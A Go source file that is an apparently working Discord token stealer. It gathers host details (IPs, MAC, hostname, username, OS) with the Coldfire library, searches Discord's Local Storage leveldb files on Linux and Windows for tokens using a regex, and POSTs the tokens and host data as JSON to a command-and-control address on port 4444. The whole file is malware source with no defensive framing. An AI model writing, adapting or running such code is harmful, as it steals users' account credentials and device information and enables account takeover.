package main

import (
	"bytes"
	"crypto/md5"
	"fmt"
	"io"
	"io/fs"
	"net/http"
	"os"
	"regexp"
	"time"

	coldfire "github.com/redcode-labs/Coldfire"
)

type TargetInfo struct {
	GateWay  string
	Core     string
	CpuNum   string
	GlobalIp string
	Hostname string
	LocalIp  string
	Mac      string
	Os       string
	Username string
}

const (
	MaxRetries int    = 3
	C2Ip       string = "127.0.0.1"
	C2Port     string = "4444"
)

var (
	target TargetInfo
	salt   int = 1
)

func main() {
	Send()
}

func Send() {
	url := "http://" + C2Ip + ":" + C2Port + "/" + GenerateDest()
	token := GetToken(FindDir())

	data := []byte(fmt.Sprintf(`{"token": "%s", "Infos: %s"}`, token, target))
	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(data))
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{}
	client.Do(req)
}

func GenerateDest() string {
	location, _ := time.LoadLocation("Europe/Paris")
	nowtime := time.Now().In(location)
	nowsecond := nowtime.Second() + salt
	hash := md5.Sum([]byte(fmt.Sprintf("%d", nowsecond)))
	hashString := fmt.Sprintf("%x", hash)
	return hashString
}

func FindDir() string {
	InitializeIfNotAlready()
	if target.Os == "GNU/Linux" {
		homeDir, _ := os.UserHomeDir()
		dirlinux := homeDir + "/.config/discord/Local Storage/leveldb/"
		return dirlinux
	} else {
		return `%AppData%\Discord\Local Storage\leveldb\`

	}

}

func InitializeIfNotAlready() {
	if target.GateWay == "" || target.Core == "" || target.CpuNum == "" || target.GlobalIp == "" || target.Hostname == "" || target.LocalIp == "" || target.Mac == "" || target.Os == "" || target.Username == "" {
		InitApp()
	}
}

func InitApp() {
	for i := 0; i < MaxRetries; i++ {
		infos := coldfire.Info()
		if infos != nil {
			target.GateWay = infos["ap_ip"]
			target.Core = infos["core"]
			target.CpuNum = infos["cpu_num"]
			target.GlobalIp = infos["global_ip"]
			target.Hostname = infos["hostname"]
			target.LocalIp = infos["local_ip"]
			target.Mac = infos["mac"]
			target.Os = infos["os"]
			target.Username = infos["username"]
			return
		}
		time.Sleep(2 * time.Second)
	}
}

func PrintInfo() {
	InitApp()
	fmt.Printf("GateWay: %s\n", target.GateWay)
	fmt.Printf("Core: %s\n", target.Core)
	fmt.Printf("CpuNum: %s\n", target.CpuNum)
	fmt.Printf("GlobalIp: %s\n", target.GlobalIp)
	fmt.Printf("Hostname: %s\n", target.Hostname)
	fmt.Printf("LocalIp: %s\n", target.LocalIp)
	fmt.Printf("Mac: %s\n", target.Mac)
	fmt.Printf("Os: %s\n", target.Os)
	fmt.Printf("Username: %s\n", target.Username)
}

func GetDir(dir string) []fs.DirEntry {
	files, _ := os.ReadDir(dir)
	return files
}

func GetToken(dir string) []string {

	files := GetDir(dir)
	token := []string{}
	for _, file := range files {

		file, _ := os.Open(dir + file.Name())

		defer file.Close()
		content, _ := io.ReadAll(file)

		re := regexp.MustCompile(`[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}`)
		matches := re.FindStringSubmatch(string(content))

		if len(matches) > 0 {
			token = append(token, matches[0])
		}

	}
	tokenfiltred := RemoveDuplicates(token)
	return tokenfiltred
}

func RemoveDuplicates(tokenarray []string) []string {
	seen := make(map[string]bool)
	filtred := []string{}
	for _, str := range tokenarray {
		if !seen[str] {
			seen[str] = true
			filtred = append(filtred, str)
		} else {
			return filtred
		}
	}
	return filtred
}
